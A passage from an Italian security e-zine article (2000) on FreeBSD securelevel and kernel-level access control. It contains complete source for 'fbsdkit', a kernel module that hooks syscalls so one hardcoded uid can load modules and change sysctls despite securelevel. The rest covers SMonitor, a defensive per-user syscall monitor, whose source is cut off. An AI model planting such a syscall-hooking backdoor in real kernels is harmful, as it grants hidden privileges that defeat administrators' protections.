@@ -1,0 +1,2393 @@
+==============================================================================
+-------------[ BFi numero 9, anno 3 - 03/11/2000 - file 12 di 21 ]------------
+==============================================================================
+
+
+-[ HACKiNG ]------------------------------------------------------------------
+---[ FreeBSD: SiCUREZZA iN SiTUAZi0Ni Di MULTiUTENZA
+-----[ pIGpEN <pigpen@s0ftpj.org>
+
+
+- - -[   i N T R 0 D U Z i O N E
+
+	Questo articolo e' una guida pratica a come bypassare, implementare ed
+	utilizzare ALCUNI supporti che hanno lo scopo di proteggere un sistema
+	operativo multiutente...
+
+	Viene preso come esempio FreeBSD dove verranno analizzati:
+
+	o   il securelevel
+	o   le ACL
+
+	e implementato un supporto simile per controllare e bloccare
+	l'esecuzione di chiamate di sistema e di utilizzo di protocolli per
+	particolari utenti...
+
+- - - [  F r e e B S D :  u n   e s e m p i o   d i   s e c u r e l e v e l
+
+	I securelevel sono settabili attraverso sysctl con 
+	mib kern.securelevel o da /etc/rc.conf attraverso la variabile
+	kern_securelevel_enable e kern_securelevel (la prima per attivare il
+	supporto, la seconda per fornire il livello di protezione).
+	E' molto importante capire che una volta settato il securelevel, non 
+	sara' piu' possibile abbassarlo:
+
+	# sysctl -w kern.securelevel=1
+	# sysctl -w kern.securelevel=-1
+	sysctl: Operation not permitted
+
+	Questo perche' il supporto e' gestito dalla seguente funzione:
+
+
+	int securelevel = -1;
+
+	static int
+	sysctl_kern_securelvl SYSCTL_HANDLER_ARGS
+	{
+		int error, level;
+	
+		level = securelevel;
+		error = sysctl_handle_int(oidp, &level, 0, req);
+		if (error || !req->newptr)
+			return (error);
+		if (level < securelevel)
+			return (EPERM);
+		securelevel = level;
+		return (error);
+	}
+
+	SYSCTL_PROC(_kern, KERN_SECURELVL, securelevel, CTLTYPE_INT|CTLFLAG_RW,
+		0, 0, sysctl_kern_securelvl, "I", "");
+
+	Infatti lo scopo dei securelevel e' quello di ridurre la
+	compromissione del sistema in condizioni privilegiate e quindi come
+	prima regola sara' necessario bloccare il passaggio da una condizione
+	sicura a una insicura.
+
+	Detto questo vediamo alcuni supporti che vengono bloccati:
+	
+		    				  LIVELLO
+					  
+			kld			    > 0
+			lkm			    > 0
+			mount			    > 0
+			procfs			    > 0
+			ptrace			    > 0
+			sysctl			    > 0
+			.			    .
+			settime			    > 1
+			.			    .
+			ipdummynet		    >= 3
+			ipfw			    >= 3
+			.			    .
+			.			    .
+			.			    .
+
+	
+	-1	
+
+	Permanently insecure mode always run the system in level 0 mode.
+	This is the default initial value.
+
+	0	
+ 
+	Insecure mode immutable and append-only flags may be turned off.
+	All devices may be read or written subject to their permissions.
+	
+ 	1	
+ 
+ 	Secure mode the system immutable and system append-only flags may not 
+	be turned off; disks for mounted filesystems, /dev/mem , and /dev/kmem
+	may not be opened for writing.
+	
+	2	
+ 
+ 	Highly secure mode same as secure mode, plus disks may not be opened 
+ 	for writing (except by mount(2) ) whether mounted or not.
+	This level precludes tampering with filesystems by unmounting them,
+	but also inhibits running newfs(8) while the system is multi-user.
+	
+	3	
+	
+	Network secure mode same as highly secure mode, plus IP packet filter 
+ 	rules (see ipfw(8) and ipfirewall(4)) cannot be changed and
+ 	dummynet(4) configuration cannot be adjusted.
+
+	Tenete presente che in altri os il comportamento puo' essere diverso
+	per ciascuno di questi livelli con piccole particolarita', ma a grandi
+	linee lo scopo e' lo stesso.
+	
+	E ora un modulo di esempio per bypassare il securelevel:
+
+		#define		FIGO		1000
+
+	e' l'uid di colui che potra' caricare moduli, modificare una
+	variabile accessibile via sysctl() bypassando il controllo sui 
+	permessi...
+	La cosa bella e' che neanche il root con securelevel impostato 
+	avra' alcuni di questi privilegi, non potra' per esempio aggiungere 
+	moduli caricabili in memoria, mentre FIGO si'...
+	Questo sfrutta proprio quanto detto prima riguardo alla funzione di
+	controllo del securelevel (sysctl_kern_securelvl()).
+
+	Il porting su versioni 4 e' banale... ed e' lasciato come esercizio
+	per il lettore.
+
+<-| fbsd_security/securelvl/fbsdkit.c crc32: 1812175330 |->
+/*
+ * Date: Sat May 20 13:24:39 2000
+ * Author: pIGpEN [ pigpen@s0ftpj.org, deadhead@sikurezza.org ]
+ *
+ * SoftProject 2000 - Digital Sekurity for Y2k
+ * Sikurezza.org - Italian Security MailingList
+ *
+ * COFFEE-WARE LICENSE - This source code is like "THE BEER-WARE LICENSE" by
+ * Poul-Henning Kamp <phk@FreeBSD.ORG> but you can give me in return a coffee.
+ *
+ * Tested on: FreeBSD 3.4-RELEASE FreeBSD 3.4-RELEASE #10: Thu Ma i386
+ *
+ * This kld gives you permission to:
+ *
+ * - load / unload a kld 	even if you aren't root (with a specific id)
+ * 				and securelevel > 0
+ * - modify a sysctl value 	"	"	"	"
+ *
+ * Note: with securelevel > 0 only FIGO can unload modules... bypassing
+ * securelevel...
+ *
+ * This is only an example It's coded for educational purposes.. don't
+ * use it!
+ */
+
+#define	FIGO	1000	/*	UID	*/
+
+
+#include <sys/param.h>
+#include <sys/proc.h>
+#include <sys/malloc.h>
+#include <sys/systm.h>
+#include <sys/module.h>
+#include <sys/kernel.h>
+#include <sys/sysproto.h>
+#include <sys/syscall.h>
+#include <sys/sysent.h>
+#include <sys/linker.h>
+
+#include <vm/vm.h>
+#include <vm/vm_extern.h>
+
+#include <sys/buf.h>
+#include <sys/sysctl.h>
+
+static int	my_kldload	__P((struct proc *, struct kldload_args *));
+static int	my_kldunload	__P((struct proc *, struct kldunload_args *));
+static int	my__sysctl	__P((struct proc *, struct sysctl_args *));
+static int	my_userland_sysctl
+				__P((struct proc *, int *, u_int, void *,
+				     size_t *, int, void *, size_t, size_t *));
+
+static int	sysctl_old_user	__P((struct sysctl_req *, const void *, 
+				     size_t));
+static int 	sysctl_new_user	__P((struct sysctl_req *, void *, size_t));
+				
+static int 	sysctl_root	SYSCTL_HANDLER_ARGS;
+
+
+static int
+module_handler(module_t mod, int cmd, void *arg)
+{
+	switch(cmd) {
+		case MOD_LOAD:
+			sysent[SYS_kldload].sy_call = (sy_call_t *) my_kldload;
+			sysent[SYS_kldunload].sy_call=(sy_call_t *)my_kldunload;
+			sysent[SYS___sysctl].sy_call = (sy_call_t *)my__sysctl;
+			break;
+		case MOD_UNLOAD:
+			sysent[SYS_kldload].sy_call = (sy_call_t *) kldload;
+			sysent[SYS_kldunload].sy_call=(sy_call_t *) kldunload;
+			sysent[SYS___sysctl].sy_call=(sy_call_t *) __sysctl;
+			break;
+	}
+	
+	return 0;
+}
+
+static moduledata_t rootkit = {
+	"r00tkit",
+	module_handler,
+	NULL
+};
+
+DECLARE_MODULE(r00tkit, rootkit, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
+
+
+
+/*
+ * We give permissions to FIGO id of load / unload a module
+ */
+
+static int
+my_kldload(struct proc *p, struct kldload_args* uap)
+{
+    char* filename = NULL, *modulename;
+    linker_file_t lf;
+    int error = 0;
+
+    p->p_retval[0] = -1;
+
+    if (securelevel > 0 && p->p_cred->p_ruid != FIGO)
+	return EPERM;
+
+    if ((error = suser(p->p_ucred, &p->p_acflag)) && p->p_cred->p_ruid != FIGO)
+	return error;
+
+    filename = malloc(MAXPATHLEN, M_TEMP, M_WAITOK);
+    if ((error = copyinstr(SCARG(uap, file), filename, MAXPATHLEN, NULL)))
+	goto out;
+
+    /* Can't load more than one module with the same name */
+    modulename = rindex(filename, '/');
+    if (modulename == NULL)
+	modulename = filename;
+    if (linker_find_file_by_name(modulename)) {
+	error = EEXIST;
+	goto out;
+    }
+
+    if ((error = linker_load_file(filename, &lf)))
+	goto out;
+
+    lf->userrefs++;
+    p->p_retval[0] = lf->id;
+
+out:
+    if (filename)
+	free(filename, M_TEMP);
+    return error;
+}
+
+static int
+my_kldunload(struct proc *p, struct kldunload_args* uap)
+{
+    linker_file_t lf;
+    int error = 0;
+
+    if (securelevel > 0 && p->p_cred->p_ruid != FIGO)
+	return EPERM;
+
+    if ((error = suser(p->p_ucred, &p->p_acflag)) && p->p_cred->p_ruid != FIGO)
+	return error;
+
+    lf = linker_find_file_by_id(SCARG(uap, fileid));
+    if (lf) {
+	KLD_DPF(FILE, ("kldunload: lf->userrefs=%d\n", lf->userrefs));
+	if (lf->userrefs == 0) {
+	    printf("linkerunload: attempt to unload file which was not loaded by user\n");
+	    error = EBUSY;
+	    goto out;
+	}
+	error = linker_file_unload(lf);
+	if (error)
+	    goto out;
+	lf->userrefs--;
+    } else
+	error = ENOENT;
+
+out:
+    return error;
+}
+
+
+static int
+my__sysctl(struct proc *p, struct sysctl_args *uap)
+{
+	int error, i, name[CTL_MAXNAME];
+	size_t j;
+
+	if (uap->namelen > CTL_MAXNAME || uap->namelen < 2)
+		return (EINVAL);
+
+ 	error = copyin(uap->name, &name, uap->namelen * sizeof(int));
+ 	if (error)
+		return (error);
+
+	error = my_userland_sysctl(p, name, uap->namelen,
+		uap->old, uap->oldlenp, 0,
+		uap->new, uap->newlen, &j);
+	if (error && error != ENOMEM)
+		return (error);
+	if (uap->oldlenp) {
+		i = copyout(&j, uap->oldlenp, sizeof(j));
+		if (i)
+			return (i);
+	}
+	return (error);
+}
+
+static struct sysctl_lock {
+	int	sl_lock;
+	int	sl_want;
+	int	sl_locked;
+} memlock;
+
+
+/*
+ * This is used from various compatibility syscalls too.  That's why name
+ * must be in kernel space.
+ *
+ * pig: we change it only for __sysctl ... giving permissions to FIGO id
+ */
+static int
+my_userland_sysctl(struct proc *p, int *name, u_int namelen, void *old, size_t *oldlenp, int inkernel, void *new, size_t newlen, size_t *retval)
+{
+	int error = 0;
+	struct sysctl_req req, req2;
+
+	bzero(&req, sizeof req);
+
+	req.p = p;
+
+	if (oldlenp) {
+		if (inkernel) {
+			req.oldlen = *oldlenp;
+		} else {
+			error = copyin(oldlenp, &req.oldlen, sizeof(*oldlenp));
+			if (error)
+				return (error);
+		}
+	}
+
+	if (old) {
+		if (!useracc(old, req.oldlen, B_WRITE))
+			return (EFAULT);
+		req.oldptr= old;
+	}
+
+	if (newlen) {
+		if (!useracc(new, req.newlen, B_READ))
+			return (EFAULT);
+		req.newlen = newlen;
+		req.newptr = new;
+	}
+
+	req.oldfunc = sysctl_old_user;
+	req.newfunc = sysctl_new_user;
+	req.lock = 1;
+
+	/* XXX this should probably be done in a general way */
+	while (memlock.sl_lock) {
+		memlock.sl_want = 1;
+		(void) tsleep((caddr_t)&memlock, PRIBIO+1, "sysctl", 0);
+		memlock.sl_locked++;
+	}
+	memlock.sl_lock = 1;
+
+	do {
+	    req2 = req;
+	    error = sysctl_root(0, name, namelen, &req2);
+	} while (error == EAGAIN);
+
+	req = req2;
+	if (req.lock == 2)
+		vsunlock(req.oldptr, req.oldlen, B_WRITE);
+
+	memlock.sl_lock = 0;
+
+	if (memlock.sl_want) {
+		memlock.sl_want = 0;
+		wakeup((caddr_t)&memlock);
+	}
+
+	if (error && error != ENOMEM)
+		return (error);
+
+	if (retval) {
+		if (req.oldptr && req.oldidx > req.oldlen)
+			*retval = req.oldlen;
+		else
+			*retval = req.oldidx;
+	}
+	return (error);
+}
+/*
+ * Transfer function to/from user space.
+ */
+static int
+sysctl_old_user(struct sysctl_req *req, const void *p, size_t l)
+{
+	int error = 0;
+	size_t i = 0;
+
+	if (req->lock == 1 && req->oldptr) {
+		vslock(req->oldptr, req->oldlen);
+		req->lock = 2;
+	}
+	if (req->oldptr) {
+		i = l;
+		if (i > req->oldlen - req->oldidx)
+			i = req->oldlen - req->oldidx;
+		if (i > 0)
+			error = copyout(p, (char *)req->oldptr + req->oldidx,
+					i);
+	}
+	req->oldidx += l;
+	if (error)
+		return (error);
+	if (req->oldptr && i < l)
+		return (ENOMEM);
+	return (0);
+}
+
+static int
+sysctl_new_user(struct sysctl_req *req, void *p, size_t l)
+{
+	int error;
+
+	if (!req->newptr)
+		return 0;
+	if (req->newlen - req->newidx < l)
+		return (EINVAL);
+	error = copyin((char *)req->newptr + req->newidx, p, l);
+	req->newidx += l;
+	return (error);
+}
+/*
+ * Traverse our tree, and find the right node, execute whatever it points
+ * at, and return the resulting error code.
+ */
+
+extern struct linker_set sysctl_;
+
+static int
+sysctl_root SYSCTL_HANDLER_ARGS
+{
+	int *name = (int *) arg1;
+	u_int namelen = arg2;
+	int indx, i, j;
+	struct sysctl_oid **oidpp;
+	struct linker_set *lsp = &sysctl_;
+
+	j = lsp->ls_length;
+	oidpp = (struct sysctl_oid **) lsp->ls_items;
+
+	indx = 0;
+	while (j-- && indx < CTL_MAXNAME) {
+		if (*oidpp && ((*oidpp)->oid_number == name[indx])) {
+			indx++;
+			if ((*oidpp)->oid_kind & CTLFLAG_NOLOCK)
+				req->lock = 0;
+			if (((*oidpp)->oid_kind & CTLTYPE) == CTLTYPE_NODE) {
+				if ((*oidpp)->oid_handler)
+					goto found;
+				if (indx == namelen)
+					return ENOENT;
+				lsp = (struct linker_set*)(*oidpp)->oid_arg1;
+				j = lsp->ls_length;
+				oidpp = (struct sysctl_oid **)lsp->ls_items;
+			} else {
+				if (indx != namelen)
+					return EISDIR;
+				goto found;
+			}
+		} else {
+			oidpp++;
+		}
+	}
+	return ENOENT;
+found:
+	/* If writing isn't allowed */
+	if (req->newptr && (!((*oidpp)->oid_kind & CTLFLAG_WR) ||
+	    (((*oidpp)->oid_kind & CTLFLAG_SECURE) && securelevel > 0 &&
+	     req->p->p_cred->p_ruid != FIGO)))
+		return (EPERM);
+
+	/* Most likely only root can write */
+	/* pig: also FIGO user here :) */
+	if (!((*oidpp)->oid_kind & CTLFLAG_ANYBODY) &&
+	    req->newptr && req->p &&
+	    (i = suser(req->p->p_ucred, &req->p->p_acflag)) &&
+	    req->p->p_cred->p_ruid != FIGO)
+		return (i);
+
+	if (!(*oidpp)->oid_handler)
+		return EINVAL;
+
+	if (((*oidpp)->oid_kind & CTLTYPE) == CTLTYPE_NODE) {
+		i = ((*oidpp)->oid_handler) (*oidpp,
+					name + indx, namelen - indx,
+					req);
+	} else {
+		i = ((*oidpp)->oid_handler) (*oidpp,
+					(*oidpp)->oid_arg1, (*oidpp)->oid_arg2,
+					req);
+	}
+	return (i);
+}
+<-X->
+
+<-| fbsd_security/securelvl/Makefile crc32: 2440877512 |->
+# SoftProject 2000 - Digital Sekurity for Y2k
+# Sikurezza.org - Italian Security MailingList
+#
+# COFFEE-WARE LICENSE - This source code is like "THE BEER-WARE LICENSE" by
+# Poul-Henning Kamp <phk@FreeBSD.ORG> but you can give me in return a coffee.
+#
+# Tested on: FreeBSD 3.4-RELEASE FreeBSD 3.4-RELEASE #3: Thu Mar i386
+# < pigpen@s0ftpj.org > 
+
+.PATH: /sys/kern
+SRCS	= fbsdkit.c
+CFLAGS+= -I/sys -Wall
+KMOD	= fbsdkit
+NOMAN	= t
+KLDMOD	= t
+
+KLDLOAD		= /sbin/kldload
+KLDUNLOAD	= /sbin/kldunload
+
+CLEANFILES+= ${KMOD}
+
+load:
+	${KLDLOAD} -v ./${KMOD}
+
+unload:
+	${KLDUNLOAD} -v -n ${KMOD}
+
+.include <bsd.kmod.mk>
+<-X->
+
+
+- - - [    S M o N i T o R :  c o s t r u i r e  u n  s u p p o r t o  n e l
+								 k e r n e l
+
+	Fino ad adesso abbiamo visto i securelevel, i quali riducono la 
+	compromissione di un sistema quando l'intruso ha accesso privilegiato.
+	Ora vediamo un supporto che ha lo scopo di limitare l'utilizzo del
+	sistema da parte di altri utenti.
+
+	SMonitor e' infatti un supporto pensato per FreeBSD che permette di
+	controllare le syscalls (e non solo) per utente o gruppo...
+   
+	A differenza di SPY (disponibile su FreeBSD.org) non utilizza la
+	sysctl ma si interfaccia al vostro sistema introducendo una nuova
+	syscall per il passaggio della regola dallo spazio utente a quello
+	assegnato al modulo.
+
+	Per memorizzare le regole SMonitor si serve di una "catena" di tipo 
+	LIST, gestita attraverso la sys/queue.h
+
+	Ad ogni regola e' poi attaccata un'altra lista sulle chiamate che si 
+	vuole agire:
+
+
+		R E G O L A
+
+		    id
+	       	(uid o gid)	  
+		   tipo 				   C H I A M A T A
+	      (utente, gruppo)			   	
+	       	 chiamate  -------------->		- tipo di chiamata
+							- azione (log, block)
+	  
+	Tale gestione permette di non utilizzare array che occupino piu'
+	spazio di quello che effettivamente potrebbe essere richiesto 
+	all'utilizzo del programma. 
+	
+	Da parte sua pero' ha lo svantaggio che risulta piu' difficile da 
+	implementare e gestire...  
+
+	Questo programma fornisce quindi messaggi sull'utilizzo delle syscall 
+	attraverso syslog, solo per gli utenti o gruppi interessati fornendo
+	eventualmente la possibilita' di bloccargli l'esecuzione della 
+	chiamata di sistema...
+	
+	SMonitor tenta pure di monitorare in modo intelligente, ovvero cercando
+	di evitare che il vostro syslog sia floodato... anche se ovviamente 
+	questo dipende pure dal numero di regole...
+
+	
+	E' un buon esempio poi per come costruirsi un firewall o sviluppare
+	nel kernel e poi rendere disponibile questo supporto...
+	Ovviamente, a livello utente... non si installa sulla vostra libc, ma
+	fornisce il suo utilizzo attraverso dei programmi semplici da 
+	sviluppare che usano la syscall(). In questo articolo allego un 
+	"client" per provare il mio supporto.
+
+
+	Ma cominciamo con una breve spiegazione per chi non ha capito dalla 
+	introduzione come sia possibile dialogare tra il kernel e lo spazio 
+	utente.
+
+	Supponiamo di avere SMonitor nel kernel:
+
+
+ ------------------------			   -------------------------
+ |                      |                          |                       |
+ |	SMonitor	|  <---------------------> |	    syscall()      |
+ |     ( S_ctl() )	|	  	   	   |                       |
+ ------------------------			   -------------------------
+								|
+								|
+								|
+								|
+								|
+						    -------------------------
+						    |			    |
+						    |	       smon         |
+						    |	    (user area)     |
+						    -------------------------
+ 
+
+	Come potete notare da questa rappresentazione banale, il passaggio
+	delle regole avviene attraverso la syscall()
+
+
+- - - [     K E R N E L  S P A C E 
+
+	     ( s t r u t t u r e  n o n  v i s t e  d a l l ' u t e n t e )
+
+	Una regola e' formata da una struttura di questo tipo:
+
+	struct s_rule {
+        	uid_t   s_id;			/* uid or gid */
+	        int     s_flags;		/* s_id is a uid or gid ? */
+	        LIST_ENTRY(s_rule) s_chain; 	/* rule entry */
+	        LIST_HEAD(,s_syscall) sys_head; /* head of logged/blocked call*/
+	};
+
+	in cui ogni syscall (accessibile via sys_head) e' implementata come 
+	segue:
+
+	struct s_syscall {
+        	LIST_ENTRY(s_syscall) sys_chain;     /* syscall entry	*/
+	        int  sys_call;                       /* syscall type	*/
+	        int  sys_flags;                      /* syscall flags 	*/
+	};
+
+	Tramite sys_flags sappiamo se la chiamata sara' bloccata o 
+	semplicemente loggata per quell'utente / gruppo.
+
+	Per maggiori spiegazioni guardate il sysmon.h
+
+
+- - - [    U S E R  S P A C E
+
+	Per passare la regola dallo spazio utente al kernel tramite la 
+	syscall() esiste una struttura che quando passa nel kernel viene 
+	gestita dalla S_ctl() la quale a sua volta chiama le funzioni 
+	interessate a seconda che si intenda cancellare / aggiungere / 
+	vedere le regole:
+
+	struct s_check {
+	        int id;         /* uid or gid           */
+	        int flags;      /* S_UID or S_GID       */
+	        int n_call;     /* OPEN, LINK ...       */
+	        int n_flags;    /* log, block           */
+	        int action;     /* ADD_RULE, DEL_RULE.. */
+	};
+
+	Per la cancellazione questa struttura deve permettere di selezionare 
+	solo una syscall o di cancellarle tutte per quel particolare id.
+	Questo si fa semplicemente settando n_call a una chiamata supportata 
+	nel primo caso o settandolo a zero nel secondo.
+
+	Detto questo vediamo un esempio di smon: il programma che ho scritto 
+	per essere utilizzato dall'admin al fine di dialogare con il supporto 
+	kernel.
+	Premetto che ovviamente si puo' benissimo scrivere il proprio
+	programma per passare le regole... questo serve per pigrizia o per una
+	modalita' piu' semplice e intuitiva.
+
+
+	# smon
+
+	<clear>
+
+	--------------------
+	-- SySMon 1.0Beta --
+	--------------------
+
+
+	1) Add rule
+	2) Del rule
+	3) List rules
+	4) Quit
+
+	sysmon> 1
+
+	<clear>
+
+	uid or gid ? -> uid
+	Uid= 1000
+	Calls:
+	open link mkfifo mount setsockopt udp ...		(taglio...)
+
+	call (ok to exit) > link
+	action (block, log): block
+	call (ok to exit) > open
+	action (block, log): log
+	call (ok to exit) > ok
+
+	<clear>
+
+	--------------------
+	-- SySMon 1.0Beta --
+	--------------------
+
+
+	1) Add rule
+	2) Del rule
+	3) List rules
+	4) Quit
+
+	sysmon> 4
+
+	#
+
+	--- ttyxx
+
+	SoftProject <PHQ>
+
+	Username> pigpen
+	s/key 91 yo70365 
+	Password:
+
+	blablablabla...
+
+	$ id
+	uid=1000(pigpen) gid=0(wheel) groups=0(wheel)
+	$ cd /tmp
+	$ touch 1
+	$ ln 1 2
+	ln: 2: Operation not permitted
+	$
+
+	<syslog>
+
+	May 6 14:42:28	/kernel: [sysmon]: link() (id=1105, uid=1000, name=ln)
+	May 6 14:42:28	/kernel: link(path=1, link=2)
+	May 6 14:42:28	/kernel: link prohibited!
+
+
+- - - [    A L T R i  A S P E T T i
+
+	E' chiaro che una regola puo' essere inserita solamente da utenti 
+	privilegiati: questo viene controllato all'interno del kernel
+	attraverso una suser() nella S_ctl(). Il supporto inoltre deve
+	controllare la regola passata; questa ad esempio non puo' avere
+	un id negativo, i flags devono essere corretti, ecc. Il supporto
+	kernel deve quindi prevedere tutte le possibili situazioni.
+
+
+- - - [    A L T R E  P 0 S S i B i L i  i M P L E M E N T A Z i 0 N i
+
+	Oltre ad introdurre una nuova syscall, il supporto potrebbe essere
+	sviluppato interfacciandosi attraverso sysctl (per questo cercate SPY
+	sul sito di FreeBSD) o ancora tramite procfs.
+	Visto che il primo modo e' stato gia' fatto e il secondo non e' poi
+	una buona scelta in BSD, ho scelto quello della syscall.
+
+
+- - - [    S U P P 0 R T 0  P E R  i  P R 0 T 0 C 0 L L i
+
+	Fino a questo punto, per quanto possa essere relativamente facile 
+	fare un supporto del genere, manca l'originalita' :)
+	
+	Ebbene smonitor funziona pure con i protocolli nello stesso modo 
+	utilizzato per le system calls.
+	
+	Questo vuol dire che, mentre alcuni utenti privilegiati possono 
+	accedere ad altre macchine attraverso un determinato protocollo,
+	si puo' decidere che alcuni users o un gruppo non possano farlo.
+
+	Com'e' possibile?
+
+	Si agisce sulla funzione di pru_attach() di quel protocollo e, nel 
+	caso questa non debba passare per volonta' di una regola di SMonitor,
+	si esce dalla funzione prima che sia allocato l'inpcb. Altrimenti si
+	puo' sempre bloccare la socket() ...
+
+	es. 		--	Blocco UDP ( via pru_attach() )
+
+	$ iousoudp fractal 666
+	[udp]: Operation not permitted
+
+	[syslog]
+
+	May 6 16:20:01  /kernel: [sysmon] udp (id=483, uid=1000 name=iousoudp)
+	May 6 16:20:01  /kernel: udp prohibited!
+
+	Notate che oltre a bloccare dice il nome del programma che e' stato 
+	invocato dall'utente... utile per poi verificare...
+
+	In SMonitor viene pure fornito un supporto di logging per utente della
+	rip_attach() quindi per tutti i protocollo che la utilizzano (es. 
+	ICMP, IGMP, IPIP e ovviamente IPPROTO_RAW).
+
+
+- - - [    C E N N i  S U L L A  C O M P A T i B i L i T A'  C O N   L A   4
+
+	Il supporto per i protocolli lavora sulla 3.4, ma non ho avuto modo di
+	fare un porting sulla 4.0... tutto il resto del sw dovrebbe funzionare
+	su entrambe le versioni senza problemi.
+
+	Dalla 4.0 c'e' un embrione di acl(3) nel kernel che e' in fase di
+	sviluppo quindi questo supporto potrebbe non essere necessario per
+	tali versioni.
+
+
+- - - [    M I G L I O R A M E N T i  ( t e m p o  p e r m e t t e n d o )
+
+	- implementare il passaggio delle regole da kernel a userland in modo
+	  serio :)
+
+	- bloccare il supporto quando c'e' una richiesta di aggiungere una
+	  regola e smonitor sta procedendo ad aggiungere/modificare/togliere
+	  un'altra
+
+	- eventualmente ordinare le list per uid e le syscall per il loro 
+	  numero assegnato
+
+	
+- - - [    I L  C 0 D i C E
+
+<-| fbsd_security/smonitor/sysmon.c crc32: 1777825870 |->
+/*
+ * Name: SMonitor
+ * Date: Sat Apr 15 11:47:13 2000
+ * Author: pIGpEN [ pigpen@s0ftpj.org, deadhead@sikurezza.org ]
+ *
+ * SoftProject 2000 - Digital Sekurity for Y2k
+ * Sikurezza.org - Italian Security MailingList
+ *
+ * COFFEE-WARE LICENSE - This source code is like "THE BEER-WARE LICENSE" by
+ * Poul-Henning Kamp <phk@FreeBSD.ORG> but you can give me in return a coffee.
+ *
+ * Tested on: FreeBSD 3.4-RELEASE FreeBSD 3.4-RELEASE #5: Mon Mar i386
+ *	      FreeBSD 4.0-RELEASE Compatible 
+ *
+ * Special thanks go to: Grace Slick	(for her voice)		oh, yeah!
+ *
+ * MON_PROTOCOL works with 3.4 Release but not with 4:
+ * 	if you include it, there are no changes...
+ * 
+ * This support was an example created for BFi magazine, It can give you an
+ * idea of how you can create and check rules on your kernel support...
+ *
+ * Note: Even if it works, smonitor is incomplete! so don't consider it a tool
+ *	 for your box, see acl(3) (under development) or look for spy at 
+ *	 www.freebsd.org if you need of an acl support..
+ * 
+ */
+
+#define MON_PROTOCOL
+#define SKIP_DEVICE
+#define SKIP_MOUNTD 
+
+#include <sys/param.h>
+#include <sys/proc.h>
+#include <sys/module.h>
+#include <sys/sysent.h>
+#include <sys/syscall.h>
+#include <sys/kernel.h>
+#include <sys/systm.h>
+
+#include <sys/malloc.h>
+#include <sys/mbuf.h>
+#include <sys/syslog.h>
+#include <sys/sysproto.h>
+#include <sys/socket.h>
+#include <sys/socketvar.h>
+
+
+#include <sys/file.h>
+#include <sys/fcntl.h>
+#include <sys/filio.h>
+
+#ifdef	MON_PROTOCOL
+# include <sys/protosw.h>
+# include <sys/socket.h>
+# include <sys/socketvar.h>
+# include <net/if.h>
+# include <net/route.h>
+# include <netinet/in.h>
+# include <netinet/in_systm.h>
+# include <netinet/in_pcb.h>
+# include <netinet/in_var.h>
+# include <netinet/ip_var.h>
+#endif
+
+#include "sysmon.h"
+
+static int module_handler __P((module_t, int, void *));
+static void log_proc	  __P((struct proc *, char *));
+#ifdef	SKIP_DEVICE
+static char * strstr	  __P((register char *, register char *));
+#endif
+
+/*
+ * Syscalls
+ */ 
+
+static int s_setsockopt	__P((struct proc *, register struct setsockopt_args *));
+static int s_mount	__P((struct proc *, register struct mount_args *));
+static int s_open	__P((struct proc *, register struct open_args *));
+static int s_link	__P((struct proc *, register struct link_args *));
+static int s_mkfifo	__P((struct proc *, register struct mkfifo_args *));
+static int s_seteuid	__P((struct proc *, register struct seteuid_args *));
+static int s_socket	__P((struct proc *, register struct socket_args *));
+static int s_unlink	__P((struct proc *, register struct unlink_args *));
+static int s_execve	__P((struct proc *, register struct execve_args *));
+static int s_setuid	__P((struct proc *, register struct setuid_args *));
+static int s_setgid     __P((struct proc *, register struct setgid_args *));
+static int s_chmod	__P((struct proc *, register struct chmod_args *));
+static int s_chown      __P((struct proc *, register struct chown_args *));
+
+#if defined(MON_PROTOCOL) && (__FreeBSD_version < 400000)
+
+/*
+ * Protocols
+ */
+
+static int s_rip_attach		__P((struct socket *, int, struct proc *));
+static int (*old_rip_attach)	__P((struct socket *, int, struct proc *));
+static int s_udp_attach		__P((struct socket *, int, struct proc *));
+static int (*old_udp_attach)	__P((struct socket *, int, struct proc *));
+
+extern struct protosw inetsw[];
+
+#endif
+
+static moduledata_t SysMon = {
+	"sysmon",
+	module_handler,
+	NULL
+};
+
+DECLARE_MODULE(sysmon, SysMon, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
+
+/*
+ * Module rules...
+ */
+
+LIST_HEAD(,s_rule) s_head;	/* head for our rules */
+MALLOC_DEFINE(M_SMON, "SMonitor", "SMonitor chain's");
+
+/*
+ * Functions for the chain of Smon 
+ */
+
+static void	s_rules_init		__P((void));
+static void	s_rules_bye		__P((void));
+static int	s_add_entry		__P((struct s_check *));
+static int	s_del_entry		__P((struct s_check *));
+static int	s_list_entry		__P((struct s_check *));
+static int	s_check_entry		__P((struct proc *, int));
+
+static void
+s_rules_init(void)
+{
+	LIST_INIT(&s_head);
+}
+
+static void
+s_rules_bye(void)
+{
+	int count = 0;
+
+	while(LIST_FIRST(&s_head)) {
+		struct s_rule *pr = LIST_FIRST(&s_head);
+
+		while(LIST_FIRST(&pr->sys_head)) {
+			struct s_syscall *scp = LIST_FIRST(&pr->sys_head);
+
+			LIST_REMOVE(LIST_FIRST(&pr->sys_head), sys_chain);
+			if(scp) free(scp, M_SMON);
+		}
+			
+
+		LIST_REMOVE(LIST_FIRST(&s_head), s_chain);
+		if(pr) free(pr, M_SMON);
+		count++;
+	}
+
+	if(count)
+		log(LOG_INFO, "[sysmon] unloaded: %d rules erased\n", count);
+
+}
+		
+/*
+ * type = S_UID 
+ * 	  S_GID
+ *
+ */
+
+static int
+s_add_entry(struct s_check *check)
+{
+	struct s_rule *pr, *pnew;
+	struct s_syscall *p_ss;
+
+	pnew = malloc(sizeof(struct s_rule), M_SMON, M_NOWAIT);
+	bzero(pnew, sizeof(*pnew));
+
+	pnew->s_id 	= check->id;
+	pnew->s_flags	= check->flags;
+
+	
+	/*
+	 * Check if our rule is the first
+	 */
+	
+	if(!s_head.lh_first) {
+		p_ss = malloc(sizeof(struct s_syscall), M_SMON, M_NOWAIT);
+		bzero(p_ss, sizeof(*p_ss));
+
+		p_ss->sys_call 	= check->n_call;
+		p_ss->sys_flags = check->n_flags;
+		
+		LIST_INSERT_HEAD(&pnew->sys_head, p_ss, sys_chain);
+		LIST_INSERT_HEAD(&s_head, pnew, s_chain);
+		return 0;
+	} else {
+		LIST_FOREACH(pr, &s_head, s_chain) {
+
+			/*
+			 * check if there is a rule with the same uid / gid
+			 */
+
+			if((pr->s_flags == check->flags) && 
+					(pr->s_id == check->id)) {
+				struct s_syscall *sc;
+				
+				/*
+				 * check if there is the same syscall and modify
+				 * it
+				 */
+				
+				LIST_FOREACH(sc, &pr->sys_head, sys_chain) {
+
+					if(sc->sys_call == check->n_call) {
+						sc->sys_flags = check->n_flags;
